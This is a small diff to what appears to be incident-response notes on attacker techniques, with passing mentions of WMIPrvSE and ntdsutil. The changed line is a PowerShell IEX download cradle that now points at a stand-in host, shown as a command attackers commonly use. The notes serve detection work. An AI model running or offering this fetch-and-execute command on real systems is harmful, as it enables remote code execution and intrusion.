@@ -99,7 +99,7 @@ If you happen to find the process WMIPrvSE in a memory image this can indicate a
 
 Many attackers will use the following command to reach out and download other files, commonly seen in webshells.
 
-IEX(New-Object System.Net.WebClient).downloadstring(‘<URL_to_file>’)
+IEX(New-Object System.Net.WebClient).downloadstring(‘http://example.com/foo.exe’)
 
 <a name="dc-ntdsutil"></a>
 ### Domain controller ntdsutil
